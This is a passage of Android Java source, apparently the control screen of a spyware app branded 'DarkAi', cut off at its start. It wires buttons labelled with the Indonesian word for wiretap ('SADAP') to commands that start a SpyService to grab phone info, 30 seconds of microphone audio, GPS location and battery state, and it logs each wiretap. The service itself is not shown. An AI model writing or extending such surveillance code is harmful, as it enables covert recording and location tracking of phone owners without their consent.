            {"INFO HP", "info"}, {"MIC 30s", "mic"},
            {"GPS", "gps"}, {"BATERAI", "battery"}
        };
        for (String[] sp : spy) {
            Button btn = new Button(this);
            btn.setText(sp[0]);
            btn.setBackgroundColor(Color.parseColor("#FF9500"));
            btn.setTextColor(Color.WHITE);
            final String cmd = sp[1];
            btn.setOnClickListener(v -> {
                Intent i = new Intent(this, SpyService.class);
                i.putExtra("cmd", cmd);
                if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
                else startService(i);
                log("SADAP: " + cmd);
                Toast.makeText(this, "Sadap " + cmd, Toast.LENGTH_SHORT).show();
            });
            root.addView(btn);
        }

        addSection(root, "LOG");
        tvLog = new TextView(this);
        tvLog.setText("[DarkAi] Ready...");
        tvLog.setTextColor(Color.parseColor("#25D366"));
        tvLog.setTypeface(Typeface.MONOSPACE);
        tvLog.setTextSize(10);
        tvLog.setBackgroundColor(Color.BLACK);
        tvLog.setPadding(20, 20, 20, 20);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 500);
        tvLog.setLayoutParams(lp);
        root.addView(tvLog);

        sv.addView(root);
        setContentView(sv);
    }

    private void addSection(LinearLayout root, String title) {
        TextView t = new TextView(this);
        t.setText(title);
        t.setTextColor(Color.parseColor("#00F0FF"));
        t.setTextSize(13);
        t.setTypeface(Typeface.DEFAULT_BOLD);
        t.setPadding(0, 30, 0, 10);
        root.addView(t);
    }

    private void log(String s) {
        String t = new java.text.SimpleDateFormat("HH:mm:ss").format(new java.util.Date());
        tvLog.append("\n[" + t + "] " + s);
    }
}
